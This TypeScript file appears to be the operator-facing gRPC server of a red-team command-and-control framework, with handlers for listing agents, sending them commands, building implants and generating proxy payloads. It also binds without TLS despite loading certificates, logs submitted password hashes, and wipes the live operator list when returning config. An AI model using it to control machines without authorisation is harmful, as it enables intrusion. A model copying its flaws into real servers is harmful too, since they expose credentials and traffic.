import Logger from "../lib/logger";
import RedChannel from "../lib/redchannel";
import { OnSuccessCallback, ServerBase } from "./base";
import * as grpc from "@grpc/grpc-js";
import { redChannelDefinition, IRedChannel } from "../pb/c2.grpc-server";
import {
    Agent,
    AgentCommandRequest,
    AgentCommandResponse,
    BuildImplantRequest,
    BuildImplantResponse,
    CommandStatus,
    ForceFetchRequest,
    ForceFetchResponse,
    GenerateProxyPayloadRequest,
    GenerateProxyPayloadResponse,
    GetAgentsRequest,
    GetAgentsResponse,
    GetBuildLogResponse,
    GetConfigRequest,
    GetConfigResponse,
    KeyxRequest,
    KeyxResponse,
    KillAgentRequest,
    KillAgentResponse,
    LogLevel,
    ProxyLoopRequest,
    ProxyLoopResponse,
    SetConfigRequest,
    SetConfigResponse,
    StreamLogRequest,
    StreamLogResponse,
} from "../pb/c2";
import { emsg } from "../utils";
import { AgentCommand } from "../pb/implant";

export interface TeamServerCerts {
    ca: Buffer | null;
    serverCert: Buffer;
    serverKey: Buffer;
}

export default class TeamServer implements ServerBase {
    log: Logger;
    server: grpc.Server;
    service: IRedChannel;
    credentials: grpc.ServerCredentials;

    constructor(protected redchannel: RedChannel, certs: TeamServerCerts, public port: number, public bindIp: string) {
        this.log = this.redchannel.log ?? new Logger();
        this.server = new grpc.Server();
        this.credentials = grpc.ServerCredentials.createSsl(
            certs.ca,
            [
                {
                    cert_chain: certs.serverCert,
                    private_key: certs.serverKey,
                },
            ],
            false
        );
        this.service = {
            getAgents: this.getAgents.bind(this),
            keyx: this.keyx.bind(this),
            agentCommand: this.agentCommand.bind(this),
            killAgent: this.killAgent.bind(this),

            buildImplant: this.buildImplant.bind(this),
            getBuildLog: this.getBuildLog.bind(this),

            getConfig: this.getConfig.bind(this),
            setConfig: this.setConfig.bind(this),

            streamLog: this.streamLog.bind(this),

            proxyLoop: this.proxyLoop.bind(this),
            generateProxyPayload: this.generateProxyPayload.bind(this),
            forceFetch: this.forceFetch.bind(this),
        };
    }

    start(onSuccess: OnSuccessCallback) {
        this.server.addService(redChannelDefinition, this.service);
        this.server.bindAsync(`${this.bindIp}:${this.port}`, grpc.ServerCredentials.createInsecure(), (err: Error | null) => {
            if (err) {
                this.log.error(`grpc error: ${err.message}`);
            } else {
                this.server.start();
                onSuccess();
            }
        });
    }

    checkAuth<I, O>(call: grpc.ServerUnaryCall<I, O> | grpc.ServerWritableStream<I, O>): boolean {
        const headersMap = call.metadata.getMap();

        const sourceIps: string[] = [call.getPeer()];
        if (headersMap["x-forwarded-for"]) sourceIps.push(headersMap["x-forwarded-for"] as string);

        const authHeader = headersMap.authorization as string;
        if (!authHeader?.length) {
            this.log.error(`auth error from client ${sourceIps}, missing authorization header`);
            return false;
        }
        const headerSplit = authHeader.split(" ");
        if (headerSplit.length < 2) {
            this.log.error(`auth error from client ${sourceIps}, invalid authorization header`);
            return false;
        }

        const tokenSplit = headerSplit[1].split(":");
        if (tokenSplit.length < 2) {
            this.log.error(`auth error from client ${sourceIps}, invalid authorization token`);
            return false;
        }

        const operator = tokenSplit[0];
        const passwordHash = tokenSplit[1];
        if (!this.redchannel.verifyOperator(operator, passwordHash)) {
            this.log.error(`auth error from client ${sourceIps}, operator did not verify: ${operator}/${passwordHash}`);
            return false;
        }

        call.metadata.add("operator", operator);
        return true;
    }

    getAgents(call: grpc.ServerUnaryCall<GetAgentsRequest, GetAgentsResponse>, callback: grpc.sendUnaryData<GetAgentsResponse>): void {
        if (!this.checkAuth<GetAgentsRequest, GetAgentsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getAgents() error: ${error}`);
            throw new Error("Server error");
        });
        // const c2CommandProto = c2.C2CommandRequest.decode(data);
        const agents = this.redchannel.getAgents();
        const agentList: Agent[] = [];

        agents.forEach((agent) => {
            agentList.push(
                Agent.create({
                    agentId: agent.id,
                    lastseen: Math.floor(agent.lastseen || 0),
                    hasPubkey: agent.pubkey ? true : false,
                    ip: [agent.ip || ""],
                    sendqSize: agent.sendq.length,
                    recvqSize: agent.recvq.size,
                    sysinfo: agent.sysinfo,
                })
            );
        });

        const responseProto = GetAgentsResponse.create({
            agents: agentList,
            status: CommandStatus.SUCCESS,
        });
        callback(null, responseProto);
    }

    killAgent(call: grpc.ServerUnaryCall<KillAgentRequest, KillAgentResponse>, callback: grpc.sendUnaryData<KillAgentResponse>): void {
        if (!this.checkAuth<KillAgentRequest, KillAgentResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`killAgent() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = KillAgentResponse.create({
            status: CommandStatus.SUCCESS,
        });
        const agentId = call.request.agentId;
        try {
            this.redchannel.killAgent(agentId);
            this.log.warn(`${call.metadata.get("operator")} killed agent(${agentId}), agent may reconnect`);
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    keyx(call: grpc.ServerUnaryCall<KeyxRequest, KeyxResponse>, callback: grpc.sendUnaryData<KeyxResponse>): void {
        if (!this.checkAuth<KeyxRequest, KeyxResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`keyx() error: ${error}`);
            throw new Error("Server error");
        });

        const agentId = call.request.agentId;
        if (!agentId) {
            this.redchannel.broadcastKeyx();
        } else {
            this.redchannel.sendCommandKeyx(agentId);
        }

        const responseProto = KeyxResponse.create({
            status: CommandStatus.SUCCESS,
        });
        callback(null, responseProto);
    }

    buildImplant(call: grpc.ServerUnaryCall<BuildImplantRequest, BuildImplantResponse>, callback: grpc.sendUnaryData<BuildImplantResponse>): void {
        if (!this.checkAuth<BuildImplantRequest, BuildImplantResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`buildImplant() error: ${error}`);
            throw new Error("Server error");
        });

        const implantModule = this.redchannel.modules.implant;

        implantModule.buildParameters = { ...call.request };

        const responseProto = BuildImplantResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            implantModule.execute();
            responseProto.outputFile = implantModule.outputFile;
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    getBuildLog(call: grpc.ServerUnaryCall<GetAgentsRequest, GetAgentsResponse>, callback: grpc.sendUnaryData<GetBuildLogResponse>): void {
        if (!this.checkAuth<GetAgentsRequest, GetAgentsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getBuildLog() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = GetBuildLogResponse.create({
            status: CommandStatus.SUCCESS,
            log: "",
        });

        const implantModule = this.redchannel.modules.implant;
        try {
            responseProto.log = implantModule.getLog();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    agentCommand(call: grpc.ServerUnaryCall<AgentCommandRequest, AgentCommandResponse>, callback: grpc.sendUnaryData<AgentCommandResponse>): void {
        if (!this.checkAuth<AgentCommandRequest, AgentCommandResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`agentCommand() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = AgentCommandResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const agentId = call.request.agentId;
        const commandParameters = call.request.parameters;
        const agentCommand = call.request.command;
        const commandImplantConfig = call.request.implantConfig;
        try {
            this.redchannel.sendAgentCommand(agentId, agentCommand, commandParameters, commandImplantConfig);
            this.log.warn(`${call.metadata.get("operator")} sent agent(${agentId}) command ${AgentCommand[agentCommand]}`);
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    getConfig(call: grpc.ServerUnaryCall<GetConfigRequest, GetConfigResponse>, callback: grpc.sendUnaryData<GetConfigResponse>): void {
        if (!this.checkAuth<GetConfigRequest, GetConfigResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getConfig() error: ${error}`);
            throw new Error("Server error");
        });

        // cleanup sensitive information
        const sanitizedConfig = this.redchannel.config;
        if (sanitizedConfig.c2) sanitizedConfig.c2.operators = {};

        const responseProto = GetConfigResponse.create({
            status: CommandStatus.SUCCESS,
            config: sanitizedConfig,
        });
        callback(null, responseProto);
    }

    setConfig(call: grpc.ServerUnaryCall<SetConfigRequest, SetConfigResponse>, callback: grpc.sendUnaryData<SetConfigResponse>): void {
        if (!this.checkAuth<SetConfigRequest, SetConfigResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`setConfig() error: ${error}`);
            throw new Error("Server error");
        });

        const newConfig = call.request.config;
        if (!newConfig) {
            callback(
                null,
                SetConfigResponse.create({
                    status: CommandStatus.ERROR,
                    message: "invalid config",
                })
            );
            return;
        }

        const responseProto = SetConfigResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const updatedEntries: string[] = [];
        for (const module in newConfig) {
            if (Object.prototype.hasOwnProperty.call(this.redchannel.config, module)) {
                for (const property in newConfig[module]) {
                    if (Object.prototype.hasOwnProperty.call(this.redchannel.config[module], property)) {
                        this.redchannel.config[module][property] = newConfig[module][property].value;
                        updatedEntries.push(`${module}.${property} = ${newConfig[module][property].value}`);
                    }
                }
            }
        }

        // if the debug property changes, reset the log level as well to show debug messages in the console
        this.redchannel.resetLogLevel();

        this.log.warn(`${call.metadata.get("operator")} updated ${updatedEntries.length} entries in c2 config:`, updatedEntries);
        callback(null, responseProto);
    }

    streamLog(call: grpc.ServerWritableStream<StreamLogRequest, StreamLogResponse>): void {
        if (!this.checkAuth<StreamLogRequest, StreamLogResponse>(call)) throw new Error("Authentication failed");

        const requestedLogLevel = call.request.level;

        const streamLogCallback = (level: LogLevel, ...msg) => {
            if (level >= requestedLogLevel) {
                const message = msg.map((entry) => {
                    if (typeof entry === "object") return JSON.stringify(entry);
                    return entry;
                });
                call.write(
                    StreamLogResponse.create({
                        level: level,
                        message: message.join(" "),
                    })
                );
            }
        };

        const eventName = "log";
        this.redchannel.log.eventEmitter.addListener(eventName, streamLogCallback);
        this.log.info(`streaming logs to ${call.metadata.get("operator")}`);

        call.on("error", (error) => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
            this.log.error(`streamLog() error: ${error}`);
            throw new Error("Server error");
        });
        call.on("close", () => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
        });
        call.on("finish", () => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
        });
    }

    proxyLoop(call: grpc.ServerUnaryCall<ProxyLoopRequest, ProxyLoopResponse>, callback: grpc.sendUnaryData<ProxyLoopResponse>): void {
        if (!this.checkAuth<ProxyLoopRequest, ProxyLoopResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`proxyLoop() error: ${error}`);
            throw new Error("Server error");
        });

        const proxyModule = this.redchannel.modules.proxy;
        const responseProto = ProxyLoopResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            if (this.redchannel.config.proxy) this.redchannel.config.proxy.enabled = call.request.start;
            proxyModule.proxyFetchLoop();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    forceFetch(call: grpc.ServerUnaryCall<ForceFetchRequest, ForceFetchResponse>, callback: grpc.sendUnaryData<ForceFetchResponse>): void {
        if (!this.checkAuth<ForceFetchRequest, ForceFetchResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`forceFetch() error: ${error}`);
            throw new Error("Server error");
        });

        const proxyModule = this.redchannel.modules.proxy;
        const responseProto = ForceFetchResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            proxyModule.proxyFetch();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    generateProxyPayload(call: grpc.ServerUnaryCall<GenerateProxyPayloadRequest, GenerateProxyPayloadResponse>, callback: grpc.sendUnaryData<GenerateProxyPayloadResponse>): void {
        if (!this.checkAuth<GenerateProxyPayloadRequest, GenerateProxyPayloadResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`generateProxyPayload() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = GenerateProxyPayloadResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const proxyModule = this.redchannel.modules.proxy;
        try {
            proxyModule.execute();
            responseProto.payload = proxyModule.payload;
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }
}
